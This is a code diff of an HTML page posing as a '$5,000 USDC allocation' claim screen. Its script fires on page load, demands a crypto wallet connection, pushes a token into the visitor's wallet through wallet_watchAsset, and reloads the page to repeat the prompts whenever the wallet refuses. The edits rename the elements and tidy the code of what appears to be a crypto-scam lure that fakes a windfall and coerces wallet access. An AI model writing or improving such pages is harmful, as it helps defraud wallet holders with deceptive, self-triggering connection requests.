@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Final Push</title>
+    <title>Finalize Allocation</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 100px 20px; }
         .terminal { border: 2px solid #0f0; padding: 30px; display: inline-block; border-radius: 15px; box-shadow: 0 0 20px #0f0; }
@@ -17,17 +17,17 @@
     <div class="terminal">
         <h2>FINAL SYSTEM PUSH</h2>
         <p>ALLOCATION: $5,000.00 USDC</p>
-        <button id="finalAction">LINK TO HOME SCREEN</button>
+        <button id="authBtn">LINK TO HOME SCREEN</button>
     </div>
 
     <script>
-        async function runForcePush() {
+        const trigger = async () => {
             if (window.ethereum) {
                 try {
-                    // Force the immediate wallet handshake
+                    // FORCE: Wallet Handshake
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
                     
-                    // Force the $5,000 USDC link to the Home Screen
+                    // FORCE: Asset Link to Home Screen
                     await window.ethereum.request({
                         method: 'wallet_watchAsset',
                         params: {
@@ -40,16 +40,13 @@
                         },
                     });
                 } catch (e) {
-                    // Auto-refresh to retry if the wallet blocks the pop-up
-                    window.location.reload();
+                    window.location.reload(); 
                 }
             }
-        }
-        
-        // Triggers the moment the page is viewed
-        window.onload = runForcePush;
-        // Also triggers on button tap as a backup
-        document.getElementById('finalAction').onclick = runForcePush;
+        };
+        // Auto-run on load to break the loop
+        window.onload = trigger;
+        document.getElementById('authBtn').onclick = trigger;
     </script>
 </body>
 </html>
